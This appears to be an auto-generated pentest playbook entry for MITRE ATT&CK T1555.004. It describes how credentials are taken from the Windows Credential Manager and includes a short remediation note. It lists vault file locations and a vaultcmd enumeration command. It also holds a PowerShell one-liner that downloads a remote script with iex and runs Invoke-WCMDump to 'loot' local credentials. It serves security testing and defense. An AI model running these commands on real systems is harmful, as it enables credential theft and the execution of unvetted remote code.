---
name: "T1555.004_windows-credential-manager"
description: "Adversaries may acquire credentials from the Windows Credential Manager."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1555.004
  - credential-access
  - windows
  - sub-technique
technique_id: "T1555.004"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1555/004"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1555
  - T1555.001
  - T1555.002
  - T1555.003
  - T1555.005
  - T1555.006
prerequisites:
  - T1555
severity_boost:
  T1555: "Chain with T1555 for deeper attack path"
  T1555.001: "Chain with T1555.001 for deeper attack path"
  T1555.002: "Chain with T1555.002 for deeper attack path"
---

# T1555.004 Windows Credential Manager

> **Sub-technique of:** T1555

## High-Level Description

Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).

The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.

Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.

Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

Password recovery tools may also obtain plain text passwords from the Credential Manager.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Windows Credential Manager technique is applicable to target environment
- [ ] Check Windows systems for indicators of Windows Credential Manager
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Access Saved Credentials via VaultCmd

List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe
Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos
https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/
https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

**Supported Platforms:** windows

```cmd
vaultcmd /listcreds:"Windows Credentials"
```

### Atomic Test 2: WinPwn - Loot local Credentials - Invoke-WCMDump

Loot local Credentials - Invoke-WCMDump technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Windows Credential Manager by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1555.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program
Consider enabling the “Network access: Do not allow storage of passwords and credentials for network authentication” setting that will prevent network credentials from being stored by the Credential Manager.


## Detection

### Detect Suspicious Access to Windows Credential Manager


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Windows Credential Manager technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Malwarebytes The Windows Vault](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)
- [Delpy Mimikatz Crendential Manager](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
- [Microsoft Credential Locker](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN)
- [Microsoft Credential Manager store](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store)
- [Microsoft CredEnumerate](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea)
- [passcape Windows Vault](https://www.passcape.com/windows_password_recovery_vault_explorer)
- [Atomic Red Team - T1555.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1555.004)
- [MITRE ATT&CK - T1555.004](https://attack.mitre.org/techniques/T1555/004)
